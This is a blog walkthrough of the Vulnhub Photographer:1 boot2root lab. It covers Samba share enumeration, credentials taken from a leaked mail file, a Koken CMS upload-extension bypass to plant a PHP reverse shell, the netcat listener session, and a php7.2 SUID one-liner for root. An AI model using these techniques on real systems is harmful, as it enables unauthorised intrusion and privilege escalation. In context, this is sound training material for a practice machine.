---
date: 2020-09-01 00:04:11
layout: post
title: "Photographer 1 Vulnhub Walkthrough"
subtitle:
description: Photographer:1 is a boot2root machine from Vulnhub. This VM is rated easy and good for beginners.
image: /assets/img/uploads/photographer/photographer.webp
optimized_image: /assets/img/uploads/photographer/photographer-optimized.webp
category: walkthrough
tags: vulnhub boot2root
author: madhavmehndiratta
paginate: false
keywords: vulnhub, photographer ctf, photographer vulnhub walkthrough, photographer 1 vulnhub, photographer vulnhub, photographer walkthrough, photographer writeup, infosecarticles, infosec articles
---

Today I will be sharing a walkthrough of Photographer:1 which is a boot2root machine available on Vulnhub. There are two flags and our goal is to read all of them. This includes enumerating samba to find some login information and then exploiting a CVE to upload a php shell and then exploiting a SUID to gain a root shell. I've added the IP to my hosts file, so Let's Begin!

```r
┌──(madhav㉿kali)-[~]
└─$ cat /etc/hosts
127.0.0.1       localhost
127.0.1.1       kali
192.168.1.32    photographer.local
```

## Initial Enumeration

I started the enumeration by running a port scan using nmap to look for open ports and default scripts. 

```r
┌──(madhav㉿kali)-[~/Documents/vulnhub/photographer]
└─$ nmap -sC -sV -oA nmap/initial photographer.local
Starting Nmap 7.80 ( https://nmap.org )
Nmap scan report for photographer.local (192.168.1.32)
Host is up (0.00034s latency).Not shown: 996 closed ports
PORT     STATE SERVICE      VERSION
80/tcp   open  http         Apache httpd 2.4.18 ((Ubuntu))
|_http-server-header: Apache/2.4.18 (Ubuntu)
|_http-title: Photographer by v1n1v131r4
139/tcp  open  netbios-ssn  Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
445/tcp  open  netbios-ssn  Samba smbd 4.3.11-Ubuntu (workgroup: WORKGROUP)
8000/tcp open  ssl/http-alt Apache/2.4.18 (Ubuntu)
|_http-generator: Koken 0.22.24
|_http-server-header: Apache/2.4.18 (Ubuntu)
|_http-title: daisa ahomi
Service Info: Host: PHOTOGRAPHER

Host script results:
|_clock-skew: mean: 1h20m00s, deviation: 2h18m33s, median: 0s
|_nbstat: NetBIOS name: PHOTOGRAPHER, NetBIOS user: <unknown>, NetBIOS MAC: <unknown> (unknown)
| smb-os-discovery: 
|   OS: Windows 6.1 (Samba 4.3.11-Ubuntu)
|   Computer name: photographer
|   NetBIOS computer name: PHOTOGRAPHER\x00
|   Domain name: \x00
|   FQDN: photographer
|_  System time: 2020-08-27T06:27:22-04:00 
| smb-security-mode: 
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
| smb2-security-mode: 
|   2.02: 
|_    Message signing enabled but not required
| smb2-time: 
|   date: 2020-08-27T10:27:22
|_  start_date: N/A

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 115.57 seconds
```
We see Samba smbd running on port 139 and 445 and Apache web servers running on port 80 and 8000. I decided to enumerate port 139 and 445 first. First I used <b>smbclient -L</b> to list all the shares available on the server. Just leave the password field blank and press enter.

```r
┌──(madhav㉿kali)-[~/Documents/vulnhub/photographer]
└─$ smbclient -L photographer.local 
Enter WORKGROUP\madhav's password: 

        Sharename       Type      Comment
        ---------       ----      -------
        print$          Disk      Printer Drivers
        sambashare      Disk      Samba on Ubuntu
        IPC$            IPC       IPC Service (photographer server (Samba, Ubuntu))
SMB1 disabled -- no workgroup available
```

Next I accessed the <b>sambashare</b> using the smbclient. Inside the share I found two files named <i>mailsent.txt</i> and 
<i>wordpress.bkp.zip.</i> I downloaded both the files using the <b>get</b> command.

```r
┌──(madhav㉿kali)-[~/Documents/vulnhub/photographer]
└─$ smbclient '\\photographer.local\sambashare'
Enter WORKGROUP\madhav's password: 
Try "help" to get a list of possible commands.
smb: \> ls
  .                                   D        0  Tue Jul 21 07:00:07 2020
  ..                                  D        0  Tue Jul 21 15:14:25 2020
  mailsent.txt                        N      503  Tue Jul 21 06:59:40 2020
  wordpress.bkp.zip                   N 13930308  Tue Jul 21 06:52:23 2020

                278627392 blocks of size 1024. 264268400 blocks available
smb: \> get mailsent.txt 
getting file \mailsent.txt of size 503 as mailsent.txt (61.4 KiloBytes/sec) (average 61.4 KiloBytes/sec)
smb: \> get wordpress.bkp.zip 
getting file \wordpress.bkp.zip of size 13930308 as wordpress.bkp.zip (160044.7 KiloBytes/sec) (average 146282.9 KiloBytes/sec)
smb: \> exit
```

The <b>mailsent.txt</b> appears to be a copy of a mail. We can save the emails and names used in the email which may be useful in future.

<img src="/assets/img/uploads/photographer/mailsent.png">

Also, I tried enumerating the <b>wordpress.bkp.zip.</b> but did not find anything useful there. I suppose that was just a rabbit hole. Next I started enumeration on port 80.

<img src="/assets/img/uploads/photographer/port80.png">

The port 80 seems to run a beautiful website. Unfortunately, I didn't find anything useful here. 

## User Shell

<img src="/assets/img/uploads/photographer/port8000.png">

Next I went to port 8000 for further enumeration. This is the Daisa's website mentioned in the <i>mailsent.txt</i> and we can see that this is built using Koken CMS. The first thing I did after reading was to check on Google if some CVE is available for this CMS. I found an <a href="https://www.exploit-db.com/exploits/48706">exploit</a> which is published by the author of this machine itself :)

<img src="/assets/img/uploads/photographer/koken.png">

To run this exploit, we need to login into the CMS first. The credentials were already with us from the <i>mailsent.txt.</i> I logged in to the Koken CMS with username <i>daisa@photographer.com</i> and password <i>babygirl.</i>

<img src="/assets/img/uploads/photographer/koken-cms.png">

Now we will upload a php reverse shell and follow the steps as mentioned in the <a href="https://www.exploit-db.com/exploits/48706">exploit.</a> I will be using the php reverse shell by <a href="https://github.com/pentestmonkey/php-reverse-shell">pentest monkey.</a> I opened the upload dialog box by clicking on the <i>Import Content</i> button.

<img src="/assets/img/uploads/photographer/upload.png">

After selecting the reverse shell, I opened Burpsuite and configured my browser to connect to the Burp proxy. I turned the Intercept on and clicked on the import button. Then, I changed the name from <b>shell.php.jpg</b> to <b>shell.php</b> in the request as mentioned in the <a href="https://www.exploit-db.com/exploits/48706">exploit.</a>

<img src="/assets/img/uploads/photographer/burp.png">


Once that's complete, you will find a download button on the right, just right click there and choose "Open in New Tab" option. 

<img src="/assets/img/uploads/photographer/download.png">

We got our shell and now we can read our first flag :)

```r
┌──(madhav㉿kali)-[~/Documents/vulnhub/photographer]
└─$ nc -lvnp 9001     
listening on [any] 9001 ...
connect to [192.168.1.4] from (UNKNOWN) [192.168.1.32] 39398
Linux photographer 4.15.0-45-generic #48~16.04.1-Ubuntu SMP Tue Jan 29 18:03:48 UTC 2019 x86_64 x86_64 x86_64 GNU/Linux
 12:23:29 up 12 min,  0 users,  load average: 0.00, 0.01, 0.01
USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
uid=33(www-data) gid=33(www-data) groups=33(www-data)
/bin/sh: 0: cant access tty; job control turned off
$ python -c 'import pty;pty.spawn("/bin/bash")'
www-data@photographer:/$ cd /home/daisa/
www-data@photographer:/home/daisa$ cat user.txt 
d41d8cd98f00b204e9800998ecf8427e
```
## Privilege Escalation

The privilege escalation for this machine was not that difficult. I started with searching for all the SUID's available.

```r
www-data@photographer:/$ find / -type f -perm -u=s 2>/dev/null
/usr/lib/dbus-1.0/dbus-daemon-launch-helper
/usr/lib/eject/dmcrypt-get-device
/usr/lib/xorg/Xorg.wrap
/usr/lib/snapd/snap-confine
/usr/lib/openssh/ssh-keysign
/usr/lib/x86_64-linux-gnu/oxide-qt/chrome-sandbox
/usr/lib/policykit-1/polkit-agent-helper-1
/usr/sbin/pppd
/usr/bin/pkexec
/usr/bin/passwd
/usr/bin/newgrp
/usr/bin/gpasswd
/usr/bin/php7.2
/usr/bin/sudo
/usr/bin/chsh
/usr/bin/chfn
/bin/ntfs-3g
/bin/ping
/bin/fusermount
/bin/mount
/bin/ping6
/bin/umount
/bin/su
```

We see a php7.2 SUID available, I searched for this on <a gref="https://gtfobins.github.io/gtfobins/php/">GTFO Bins</a> and found the way to escalate our privileges by using the following command.  

```r
www-data@photographer:/$ /usr/bin/php7.2 -r "pcntl_exec('/bin/bash', ['-p']);"
```
After executing, we can read our final flag!

<img src="/assets/img/uploads/photographer/root.png">

That’s it! Thanks for reading. Stay tuned for similar walkthroughs and much more coming up in the near future!
If you have any queries, you can contact me <a href="/contact">here.</a>

NOTE: The awesome artwork used in this article was created by <a href="https://dribbble.com/laurenmayhewlm">Lauren Mayhew.</a>
